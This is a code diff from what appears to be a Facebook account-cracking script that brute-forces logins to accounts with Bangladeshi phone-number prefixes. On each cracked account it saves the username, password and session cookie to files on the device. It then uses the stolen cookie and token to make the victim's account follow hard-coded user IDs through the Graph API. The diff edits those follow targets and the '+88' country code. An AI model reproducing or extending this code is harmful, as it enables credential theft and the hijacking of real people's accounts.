@@ -941,15 +941,11 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736'
+                        follow_id='100000160984736' #uzzal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100000160984736'
+                        follow_id='100009468801755' #riyad
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100009468801755'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100090262215259'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
-                        follow_id='100038890422760'
+                        follow_id='100038890422760' #gopal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
@@ -1371,7 +1367,7 @@ class crack:
             print ('\033[1;33mExample 016, 017, 018, 019 ,etc.\033[0;97m')
             print (43*'-')
             os.system('rm -rf .num.txt')
-            k = '88'
+            k = '+88'
             c = input('\033[1;36mEnter Code: \033[0;97m')
             os.system('clear')
             print (logo4)
